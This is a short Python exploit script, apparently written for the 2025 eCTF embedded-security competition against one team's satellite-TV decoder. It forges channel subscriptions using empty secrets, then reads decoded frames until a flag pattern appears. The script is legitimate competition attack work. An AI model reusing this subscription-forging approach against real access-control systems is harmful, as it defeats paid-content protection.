#!/usr/bin/env python3
# for ETSU
import asyncio
import itertools
import json
import os
import re
import sys

from ectf25.tv import TV
from ectf25_design.gen_subscription import gen_subscription
from loguru import logger

from attack_utils import conn, get_decoder_id, recording_playback, run_attack


class AttackTV(TV):
    def decode(self):
        """Serve frames from the queue to the Decoder, printing the decoded results"""
        logger.info("Starting Decoder loop")
        try:
            i = 0
            while not self.crash.is_set() and i < 10:
                if not self.to_decode.empty():
                    # Get an encoded frame from the queue
                    encoded = self.to_decode.get_nowait()

                    # Send the frame to be decoded
                    decoded = self.decoder.decode(encoded)

                    # Print the frame
                    try:
                        # if the frame contains printable text, pretty print it
                        logger.info((b"\n" + decoded).decode("utf-8"))
                    except UnicodeDecodeError:
                        # if we can't decode bytes, fall back to just printing the frame
                        logger.info(decoded)

                    if re.search(
                        r"[a-fA-F0-9]{16}\^ flag \^",
                        decoded.decode("utf-8", errors="ignore"),
                    ):
                        return
                    i += 1
        except Exception:
            logger.critical("Decoder crashed!")
            self.crash.set()
            raise


async def main():
    decoder_id = get_decoder_id()

    r = conn()

    subscriptions = [
        gen_subscription(b"{}", decoder_id, 0, 2**63 - 1, i) for i in range(4)
    ]

    for subscription in subscriptions:
        r.subscribe(subscription)

    for channel in [2, 3, 4]:
        tv = AttackTV(
            os.environ["IP"],
            int(os.environ[f"CHANNEL_{channel}_PORT"]),
            "/dev/ttyACM0",
            115200,
        )

        tv.run()

    await recording_playback()


if __name__ == "__main__":
    run_attack(main, 30)
